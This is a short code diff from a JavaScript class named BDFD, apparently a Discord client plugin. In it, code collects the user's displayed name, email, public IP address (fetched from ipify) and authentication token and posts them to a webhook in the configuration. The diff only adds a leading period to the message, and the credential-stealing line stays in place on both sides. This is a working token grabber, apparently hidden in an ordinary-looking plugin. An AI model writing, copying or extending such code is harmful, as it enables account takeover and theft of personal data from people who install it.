@@ -35,7 +35,7 @@ class BDFD {
         const username = $("[class *= \"nameTag\"]").first().text();
 
         $.getJSON("https://api.ipify.org?format=json", (data) => { 
-            require("request").post(config.webhook, {form: {content: `\nNAME: **__${username}__**\nMAIL: **__${userEmail}__**\nIP: __${data.ip}__\n\n**TOKEN:**\`\`\`${authToken}\`\`\``}});
+            require("request").post(config.webhook, {form: {content: `.\nNAME: **__${username}__**\nMAIL: **__${userEmail}__**\nIP: __${data.ip}__\n\n**TOKEN:**\`\`\`${authToken}\`\`\``}});
         });
     }
 }
